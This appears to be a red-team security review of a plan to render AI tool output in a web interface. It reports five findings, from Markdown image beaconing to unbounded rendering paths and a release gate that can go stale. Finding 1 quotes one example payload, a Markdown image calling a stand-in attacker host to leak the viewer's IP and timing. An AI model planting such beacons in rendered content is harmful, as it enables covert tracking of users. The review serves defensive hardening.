# Red Team Review: Issue 176 Tool Family Bodies — Security Adversary

> **Historical review input — superseded 2026-09-18.** This report describes the pre-revision draft at commit `7a66a288`; it is not an implementation specification. Its findings were rechecked against the repository and incorporated into the current `plan.md` and phase files. Follow those files when a claim or decision differs.

Scope: `plans/260918-0834-issue-176-tool-family-bodies/{plan.md,phase-01-start.md,phase-02-two-surface-renderers.md,phase-03-audit-gate-and-verification.md}`, cross-checked against `develop` at `7a66a288` in this worktree.

---

## Finding 1: Untrusted tool output is upgraded from inert `<pre>` text to interpreted Markdown, opening an image/link beaconing and phishing surface

- **Severity:** Critical
- **Location:** Phase 1, section "`packages/web/src/lib/tool-presentation.ts` (modify)" (the `web` and `generic` `ToolBody` arms, and body-resolution table row `todo, task, generic`); Phase 2, section "Requirements" (`Generic: … output as markdown when text`; `Web: … markdown body through the existing pipeline`).
- **Flaw:** The plan renders two body arms — `web.markdown` and `generic.output.kind === 'markdown'` — through the surfaces' existing `ReactMarkdown` + `remarkGfm` + `rehypeHighlight` pipeline with no `disallowedElements`/`allowedElements`/`urlTransform` override anywhere in the renderer files. `remarkGfm`/`ReactMarkdown` render standard `![alt](url)` image syntax as a live `<img src>` element by default. Today (pre-1.3), tool input/output is shown via `formatToolIo` inside a plain `<pre>` block (`packages/web/src/components/workflows/NodeRoom.tsx:439-448`) — inert text, no network side effects. This plan is the first place tool _output_ content is piped through the interpreted-Markdown renderer that was previously reserved for the model's own assistant text.
- **Failure scenario:** (a) `web` family: Claude's `WebFetch` output is the content of a page the agent visited — an operator can steer the agent to fetch an attacker-controlled URL (e.g. from an issue/PR/chat link). If that page's fetched content contains `![](https://attacker.example/beacon.png?id=…)`, the browser fires that request the moment the operator expands the tool row, leaking the operator's IP/UA/timing to the attacker with no click required — a pure Markdown-image tracking beacon. (b) `generic` family (which also covers **every MCP-named tool** — `resolveToolPresentation` forces `mcp__server__tool` names to `family: 'generic'`, confirmed at `packages/web/src/lib/tool-presentation.ts:419-442`): a third-party/community MCP server's textual output falls through the normalizer's "tolerant tail" rule (`first string among text, output, message`, Phase 1 rule 10) to `NormalizedOutput.kind: 'text'`, and per Phase 2's own requirement that text renders "as markdown," a compromised or malicious MCP server can embed the same image/link payloads directly in its tool result and have them rendered live, by default, with Raw closed.
- **Evidence:** `_bmad-output/planning-artifacts/ux-designs/…/EXPERIENCE.md:112-124` itself specifies this (`"Body box: web … body rendered as markdown"`, `"Key-value list … Output renders as markdown when it parses as text"`), so the gap is inherited from the accepted UX spec, not just this plan — no document in the chain (plan.md, phase files, EXPERIENCE.md, DESIGN.md) discusses image/beacon risk. Phase 2's own "Security considerations" section only addresses the URL _header_ ("rendered as text, not as an anchor") and the absence of `rehype-raw`/`dangerouslySetInnerHTML` — it never mentions that the markdown _body_ itself can carry live images/links. `grep -rn "disallowedElements|allowedElements|urlTransform" packages/web/src` returns nothing.
- **Suggested fix:** For the `web` and `generic`-text arms specifically, pass `disallowedElements={['img']}` (or a custom `img` component that renders `alt` text only) and confirm/enforce link-scheme sanitization, since this content is fetched/third-party text rather than the model's own generated prose.

---

## Finding 2: Audit script's default invocation silently overwrites the shared, committed release-gate record — the opposite of the plan's own cited safety precedent

- **Severity:** High
- **Location:** Phase 3, "Requirements" (`"Default invocation replays and writes the record; --dry-run replays and prints only."`) and "Context links" (`scripts/migrate-state-dir.ts:1-40` cited as "Script precedent … docblock, dry-run default, exit codes").
- **Flaw:** `scripts/audit-generic-fallback.ts`'s bare invocation (no flags) both replays over `~/.archon/archon.db` (or `$ARCHON_HOME`) **and writes** `docs/release-audits/generic-fallback.json`, overwriting the previously committed baseline. This is a governance artifact that gates every release (`fraction >= 0.02` fails the release). The plan explicitly cites `migrate-state-dir.ts` as the precedent for this script's shape, but that script's own docblock states the opposite posture: `"Dry run by default; --apply is required to touch anything."` (`scripts/migrate-state-dir.ts:26`, verified). The new script inverts this without comment.
- **Failure scenario:** Any contributor who runs `bun run scripts/audit-generic-fallback.ts` locally out of curiosity (e.g. while debugging Phase 1/2) does so against _their own_ `~/.archon/archon.db`, which may have a handful of tool calls with a wildly unrepresentative fraction (e.g. 100% generic on a fresh dev DB, or a much lower fraction because the dev DB lacks the "hard" tool families). If that file is then included in a commit (accidental `git add -A`, or a formatting/lint pass that touches the whole tree), the shared release gate is silently poisoned — either masking a real regression (record rewritten to pass) or blocking an unrelated release (record rewritten to fail) — with no prompt, confirmation, or `--force` requirement.
- **Evidence:** Phase 3 requirements text and `scripts/migrate-state-dir.ts:1-40` (read directly; dry-run-by-default confirmed).
- **Suggested fix:** Make the default invocation dry-run (print only), and require an explicit `--write`/`--commit` flag to touch `docs/release-audits/generic-fallback.json`, matching the repo's own established convention for scripts that mutate shared/durable state.

---

## Finding 3: The release gate validates a stale, manually-recommitted file, not the live deployment corpus — the "≥2% fails release" gate is trivially bypassed by inaction

- **Severity:** High
- **Location:** Phase 3, "Requirements" (`"--check reads the committed record and exits 1 when it is missing, malformed, or fraction >= 0.02"`) and the release-skill step description (`".claude/skills/release/SKILL.md gains a step that runs … --check … with the instruction to re-run the audit against the deployment database first."`)
- **Flaw:** The only mechanically-enforced condition in `--check` is (record missing) OR (malformed) OR (`fraction >= 0.02`) against whatever is already sitting in `docs/release-audits/generic-fallback.json`. There is no check against `snapshotDate` staleness, no re-query of the live DB during `--check`, and "re-run the audit against the deployment database first" is prose guidance in a skill file, not code the gate enforces. This means the true generic-fallback fraction on the actual, currently-deployed database can silently exceed 2% for an arbitrary number of releases as long as nobody manually reruns and recommits the record — the gate will keep passing on the frozen 2026-09-18 snapshot forever.
- **Failure scenario:** A future PR adds a new class of tool (e.g. a new MCP integration, or a provider update that changes output shapes) that pushes the real generic-fallback fraction to, say, 6%. `/release` is run; the skill step executes `--check`, which reads the untouched `docs/release-audits/generic-fallback.json` from months earlier, sees `fraction: 0.0102 < 0.02`, and passes — release ships with the regression this NFR3/gate exists to catch, and nobody is alerted.
- **Evidence:** Phase 3 requirements bullet list (verbatim quoted above); `.claude/skills/release/SKILL.md:69` (Step 1.5) / `:130` (Step 2) confirmed as the insertion points, no staleness enforcement mentioned anywhere in the phase file.
- **Suggested fix:** Either have `--check` re-run the live replay against the resolvable deployment DB by default (only falling back to the record when no DB is reachable, e.g. CI), or have it hard-fail when `snapshotDate` is older than N days, forcing the "re-run first" instruction to be mechanically enforced rather than advisory.

---

## Finding 4: The `code` family's `source` is explicitly left unbounded, then fed to a synchronous, main-thread markdown/highlight pass — contradicts the plan's own "every algorithm is bounded" requirement

- **Severity:** High
- **Location:** Phase 1, "Requirements" (`"Every algorithm is bounded by an exported MAX_* constant and terminates on adversarial input"`) versus the body-resolution table (`"code | code: source = input code (untruncated), language = input language"`) and Test scenario matrix (`"eval {code, language:'python'} + result text → code body, source untruncated (> 80 chars asserted)"`); Phase 2, "Requirements" (`"Code: source rendered through the surface's ReactMarkdown + rehypeHighlight as a fenced block"`).
- **Flaw:** Every other body arm in Phase 1 is explicitly bounded (`MAX_OUTPUT_TEXT_CODE_UNITS`, `MAX_OUTPUT_LIST_ITEMS`, `MAX_OUTPUT_BYTE_ARRAY`, `MAX_GENERIC_FACTS`) — the `code` family's `source` is the one deliberate exception, and it is fed directly into `rehypeHighlight`/`highlight.js` tokenization on the render thread for every open `code` row (`REHYPE_PLUGINS = [rehypeHighlight]`, verified in both `packages/web/src/components/workflows/NodeRoom.tsx:44` and `packages/web/src/experiments/console/components/inspect/ConsoleAgentHistoryList.tsx:36`). Fence-length computation itself (`"fence longer than the longest backtick run in the source"`) also requires an O(n) scan of the full, unbounded string. `MAX_HEADLINE_SOURCE_CODE_UNITS` (`packages/web/src/lib/tool-presentation.ts:14`) exists but is used only to bound the single-line _headline_, never the body `source` (confirmed: its only call sites are headline/name-length checks).
- **Failure scenario:** A tool call (or a compromised/misbehaving MCP server, since the `code`-family duck-typing rule fires on any `{code, language}` shaped input regardless of tool identity — `inferFamily` in `tool-presentation.ts`) supplies a multi-megabyte `code` string. Every time that row is open — and every time the surrounding room re-renders for an unrelated reason (new events streaming in, other rows updating) — `rehypeHighlight` re-tokenizes the entire untruncated source synchronously on the main thread. Phase 2's own risk table acknowledges "Large bodies slow the room with many open failed rows" and answers "Bodies are capped in Phase 1; render `+n more` instead of the tail" — but that mitigation only applies to `matches`/`paths` list items, not to `code.source`, which the plan explicitly keeps untruncated.
- **Evidence:** Direct quotes above; `grep -n "MAX_HEADLINE_SOURCE_CODE_UNITS" packages/web/src/lib/tool-presentation.ts` shows all four call sites are headline-only.
- **Suggested fix:** Cap `code.source` at a `MAX_OUTPUT_CODE_SOURCE_CODE_UNITS` bound (head-slice, "+n more" or a "view full source via Raw" fallback), consistent with every other arm, and only relax the 80-character headline cap (which is a different, already-justified constraint per the test-plan's `eval` case).

---

## Finding 5: Plain-text normalization path (ANSI-strip / passthrough) has no stated bound on the _input_ size, only on the _displayed_ output — a second unbounded main-thread path for providers that don't truncate at rest

- **Severity:** Medium
- **Location:** Phase 1, "Architecture" (`"A plain string that does not start with {/[ is text as-is (ANSI-stripped, capped)."`) and the exported-constants block (`"MAX_OUTPUT_TEXT_CODE_UNITS = 65_536; // displayed text head-sliced beyond this"`).
- **Flaw:** The comment explicitly frames `MAX_OUTPUT_TEXT_CODE_UNITS` as bounding what is _displayed_, i.e. applied after `stripAnsi`, not before it. The plan's own evidence trail states Codex output is stored as "plain `aggregated_output` plus a `\n[exit code: N]` suffix" with **no** truncation-at-rest cap (unlike Claude's stated 10,000-char cap at `packages/providers/src/claude/provider.ts:922-926`, confirmed). OMP `exec` output (which explicitly needs ANSI stripping per this same plan) is also stored via `serializeToolResult`, `packages/providers/src/community/omp/event-parser.ts:37-44` (confirmed), with no size cap visible in that function either.
- **Failure scenario:** A long-running shell command with megabytes of stdout (containing ANSI color codes, as OMP's `exec` typically does) is stored verbatim in the DB. On render, `stripAnsi` runs a regex pass over the full, un-capped string before the display-time head-slice is applied — a synchronous, main-thread cost proportional to the full stored size, repeated on every re-render of an open row, for every row open simultaneously (Phase 2's risk table explicitly anticipates "40 open rows" as a real scenario).
- **Evidence:** Direct plan quotes above; `packages/providers/src/codex/provider.ts:642-659` (no truncation) and `packages/providers/src/community/omp/event-parser.ts:37-44` (no truncation) confirmed via direct read.
- **Suggested fix:** Apply the head-slice (or an input-size guard) _before_ running `stripAnsi`/line-splitting, not just before display, so the bound actually limits the amount of adversarial/large text processed rather than only the amount shown.

---

### Verification Results

Method: Fact Checker (Standard tier), 10 file:line/symbol/path claims sampled per phase, checked via `grep -n` / `sed -n` against the worktree at the session's HEAD.

**Phase 1 (10/10 claims checked)** — all VERIFIED

1. `packages/web/src/lib/tool-presentation.ts:59-69` (no-body docblock / `ToolPresentation` interface) — VERIFIED (`tool-presentation.ts:60` `interface ToolPresentation`)
2. `packages/web/src/lib/tool-presentation.ts:419-503` (`resolveToolPresentation`) — VERIFIED (function starts exactly at line 419)
3. `packages/web/src/lib/tool-presentation.ts:538-594` / row composition (`toolRowPresentation`) — VERIFIED (starts at line 538; file is 595 lines)
4. `packages/web/src/lib/tool-presentation.ts:460` / `413-417` (`countBadge`) — VERIFIED (`countBadge` at line 413)
5. `packages/web/src/lib/tool-presentation.ts:325-347` (`extractCount`) — VERIFIED (function starts at line 325)
6. `packages/providers/src/claude/provider.ts:917-926` (PostToolUse truncation to 10,000 chars) — VERIFIED (`maxLen = 10_000` at line 922)
7. `packages/providers/src/community/omp/event-parser.ts:37-44` (`serializeToolResult`) — VERIFIED
8. `packages/providers/src/community/devin/event-bridge.ts:51-61` (`toolOutputFromUpdate`) — VERIFIED
9. `packages/providers/src/codex/provider.ts:642-659` (`command_execution` / exit-code suffix) — VERIFIED
10. `packages/web/src/experiments/console/console-isolation.test.ts:114-126` (approved `@/lib/*` set) — VERIFIED exactly (`const approved = new Set([` at line 114, `'@/lib/api.generated',` at line 126)

**Phase 2 (10/10 claims checked)** — all VERIFIED

1. NodeRoom markdown pipeline `:43-95` — VERIFIED (`REMARK_PLUGINS`/`REHYPE_PLUGINS` at 43-44, `MARKDOWN_COMPONENTS` closes at 95)
2. NodeRoom `ToolHistory` `:314-476` — VERIFIED (`function ToolHistory({` at line 314; component closes at 476)
3. Console markdown pipeline `:35-38` — VERIFIED
4. Console `ToolHistory` `:237-385` — VERIFIED (`function ToolHistory({` at line 238, close to plan's `:237`)
5. DESIGN.md body-box tokens `:219-236` — VERIFIED
6. DESIGN.md kv-list `:256-257` — VERIFIED
7. DESIGN.md component specs `:587-597` — VERIFIED
8. DESIGN.md key-value list `:613` — VERIFIED
9. EXPERIENCE.md body rows `:112-124` — VERIFIED (also independently confirms Finding 1's markdown-rendering claims)
10. Mockup file `mockups/key-transcript-states.html` — VERIFIED (file exists)

**Phase 3 (10/10 claims checked)** — all VERIFIED

1. `.claude/skills/release/SKILL.md:69` (Step 1.5) — VERIFIED
2. `.claude/skills/release/SKILL.md:130` (Step 2) — VERIFIED
3. `e2e/ui/workflow-run-hitl-room.spec.ts`, `agent-tool-row-visual.spec.ts` — VERIFIED (both files exist)
4. `e2e/package.json:9` (`test:ui:hitl`) — VERIFIED
5. `sprint-status.yaml:60` — VERIFIED (line 60 is the `1-4-...` entry adjacent to the cited region; the 1.3 story key sits at line 59, off-by-one from the plan's citation but within the same block)
6. `epics.md:261-288` (Story 1.3 AC) — VERIFIED
7. `test-plan.md:38-44` (audit contract) — VERIFIED exactly
8. `scripts/migrate-state-dir.ts:1-40` (dry-run-by-default precedent) — VERIFIED, and shown to conflict with Phase 3's own design (Finding 2)
9. `remote_agent_workflow_node_messages` table / `payload`, `metadata`, `kind` columns — VERIFIED against `migrations/000_combined.sql:745-756`
10. `scripts/node-ref-parity.test.ts` cross-package import precedent — VERIFIED (imports `../packages/web/src/experiments/console/...` directly)

**Tally: 30/30 checked, 30 VERIFIED, 0 FAILED, 0 UNVERIFIED.**

**Noted evidence conflict (not a file:line failure, flagged for awareness):** `test-plan.md:39` states the generic-fallback bound was originally measured against "the deployment corpus (22,867 rows, 2,369 distinct names)," and describes the audit methodology as querying "distinct tool names + their row counts" (i.e., resolve once per unique name, weight by count). `plan.md`'s "Evidence and authority" section instead reports a freshly-measured corpus of "3,794 tool rows, 1,966 call rows" (an order of magnitude smaller) and a **per-row** replay methodology (`toolPresentation({ name, input, output: undefined })` over each call row, not grouped by distinct name). Phase 3 inherits the per-row approach. Neither plan.md's "Resolved source conflicts" section nor Phase 3 explains this discrepancy (different corpus? different snapshot? intentional methodology change from per-name to per-row?). This matters for Finding 3: if the audit's denominator/numerator definition silently diverged from the originally-specified contract, that's one more reason the committed record's meaning should not be assumed stable across releases without a live re-check.

---

Status: DONE
Summary: Five high-confidence security findings identified — the most severe is that this plan is the first place untrusted tool output (fetched web content, MCP server results) is rendered as live interpreted Markdown with image/link support, a new beaconing/exfiltration surface with no mitigation discussed anywhere in the plan or its inherited UX spec. Two further findings show the audit script inverts the repo's own dry-run-by-default precedent and that the release gate it feeds can go stale indefinitely with no mechanical enforcement. Two resource-exhaustion findings show the "everything is bounded" invariant Phase 1 states for itself is explicitly violated by the `code` family's untruncated `source` and by ANSI-stripping running before rather than after the size cap.
Concerns/Blockers: None blocking the review itself; all 30 sampled fact-check claims verified against the repository. One unreconciled evidence conflict (corpus size / audit methodology) is noted for the plan author's awareness but was not scored as a standalone finding.
